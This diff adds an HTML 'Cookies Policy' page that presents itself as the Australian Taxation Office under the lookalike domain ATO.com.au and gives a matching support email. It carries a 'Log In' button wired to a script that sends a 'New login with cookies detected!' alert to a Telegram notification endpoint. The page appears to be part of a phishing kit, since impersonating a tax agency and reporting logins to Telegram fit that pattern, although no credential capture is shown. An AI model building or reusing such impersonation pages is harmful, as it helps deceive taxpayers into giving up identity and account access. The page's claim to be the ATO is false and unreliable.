@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="description" content="Read ATO's cookies policy and learn how we use cookies to enhance your experience and ensure security.">
+    <title>Cookies Policy - ATO</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f4f4f4;
+        }
+        header {
+            text-align: center;
+            padding: 10px;
+            background-color: #004c97;
+            color: white;
+        }
+        h1, h2 {
+            color: #004c97;
+        }
+        p {
+            line-height: 1.6;
+        }
+        a {
+            color: #004c97;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .content {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 800px;
+            margin: auto;
+        }
+        footer {
+            text-align: center;
+            padding: 20px;
+            margin-top: 20px;
+        }
+        #loginButton {
+            background-color: #004c97;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            cursor: pointer;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        #loginButton:hover {
+            background-color: #003366;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cookies Policy</h1>
+        <p>Last updated: October 2024</p>
+    </header>
+
+    <main class="content">
+        <p>Welcome to <strong>ATO.com.au</strong>. This page explains how we use cookies and similar technologies to improve your experience, gather analytics, and ensure secure access to our online services. By continuing to use our website, you agree to the use of cookies as described below.</p>
+
+        <h2>What Are Cookies?</h2>
+        <p>Cookies are small text files that are placed on your device by websites you visit. They help us improve our site’s functionality, offer personalized services, and remember your preferences.</p>
+
+        <h2>Why We Use Cookies</h2>
+        <p>We use cookies to:</p>
+        <ul>
+            <li><strong>Enhance your experience:</strong> By remembering your login information, preferences, and settings.</li>
+            <li><strong>Analyze site performance:</strong> Collecting anonymized data to help us improve our website.</li>
+            <li><strong>Ensure security:</strong> Cookies help protect your data and ensure secure browsing.</li>
+        </ul>
+
+        <h2>Types of Cookies We Use</h2>
+        <ul>
+            <li><strong>Essential Cookies:</strong> These cookies are necessary for the operation of the website, including access to secure areas such as your login page.</li>
+            <li><strong>Performance Cookies:</strong> These help us understand how visitors interact with our site by collecting information anonymously.</li>
+            <li><strong>Functional Cookies:</strong> These allow the website to remember choices you make, like your language or the region you are in.</li>
+            <li><strong>Targeting Cookies:</strong> These may be used to deliver relevant advertising and track the effectiveness of campaigns.</li>
+        </ul>
+
+        <h2>How to Manage Cookies</h2>
+        <p>You can manage or disable cookies in your browser settings. Please note that disabling cookies may affect your ability to log in or access certain parts of the site.</p>
+        <p>For more information on how to manage cookies, visit your browser’s help section or these guides:</p>
+        <ul>
+            <li><a href="https://support.google.com/chrome/answer/95647" target="_blank">Chrome</a></li>
+            <li><a href="https://support.mozilla.org/en-US/kb/cookies-information-websites-store-on-your-computer" target="_blank">Firefox</a></li>
+            <li><a href="https://support.apple.com/en-au/guide/safari/sfri11471/mac" target="_blank">Safari</a></li>
+        </ul>
+
+        <h2>Link to ATO Login</h2>
+        <p>If you are a registered user and need to access your account, click the link below to log in:</p>
+        <p><a href="https://www.ato.gov.au/Login/" target="_blank"><strong>ATO Login</strong></a></p>
+
+        <p>For additional help or questions regarding our cookie policy, please contact our support team at <a href="mailto:support@ato.com.au">support@ato.com.au</a>.</p>
+
+        <!-- Add a Login Button -->
+        <button id="loginButton">Log In</button>
+    </main>
+
+    <footer>
+        <p>&copy; 2024 ATO.com.au | All Rights Reserved</p>
+        <p><a href="/privacy-policy.html">Privacy Policy</a> | <a href="/terms-of-service.html">Terms of Service</a></p>
+    </footer>
+
+    <!-- JavaScript to Notify Telegram -->
+    <script>
+        document.getElementById('loginButton').addEventListener('click', function() {
+            // Send a request to the server
+            fetch('sendTelegramNotification.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    message: 'New login with cookies detected!' // Customize the message as needed
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Notification sent:', data);
+            })
+            .catch((error) => {
+                console.error('Error sending notification:', error);
+            });
+        });
+    </script>
+</body>
+</html>
